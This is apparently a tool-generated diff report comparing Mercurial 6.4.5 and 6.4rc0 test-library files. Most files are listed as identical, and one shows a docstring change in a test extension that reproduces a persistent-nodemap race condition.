### Comparing `mercurial-6.4.5/tests/testlib/ext-sidedata-3.py` & `mercurial-6.4rc0/tests/testlib/ext-sidedata-3.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/ext-sidedata-4.py` & `mercurial-6.4rc0/tests/testlib/ext-sidedata-4.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/ext-sidedata-5.py` & `mercurial-6.4rc0/tests/testlib/ext-sidedata-5.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/ext-sidedata.py` & `mercurial-6.4rc0/tests/testlib/ext-sidedata.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/ext-stream-clone-steps.py` & `mercurial-6.4rc0/tests/testlib/ext-stream-clone-steps.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/merge-combination-util.sh` & `mercurial-6.4rc0/tests/testlib/merge-combination-util.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/persistent-nodemap-race-ext.py` & `mercurial-6.4rc0/tests/testlib/persistent-nodemap-race-ext.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,8 +1,8 @@
-r"""Create the race condition for issue6554
+"""Create the race condition for issue6554
 
 The persistent nodemap issues had an issue where a second writer could
 overwrite the data that a previous write just wrote. The would break the append
 only garantee of the persistent nodemap and could confuse reader. This
 extensions create all the necessary synchronisation point to the race condition
 to happen.
```

### Comparing `mercurial-6.4.5/tests/testlib/push-checkheads-util.sh` & `mercurial-6.4rc0/tests/testlib/push-checkheads-util.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/sigpipe-remote.py` & `mercurial-6.4rc0/tests/testlib/sigpipe-remote.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/stream_clone_setup.sh` & `mercurial-6.4rc0/tests/testlib/stream_clone_setup.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/testlib/wait-on-file` & `mercurial-6.4rc0/tests/testlib/wait-on-file`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/tinyproxy.py` & `mercurial-6.4rc0/tests/tinyproxy.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/wireprotohelpers.sh` & `mercurial-6.4rc0/tests/wireprotohelpers.sh`

 * *Files identical despite different names*

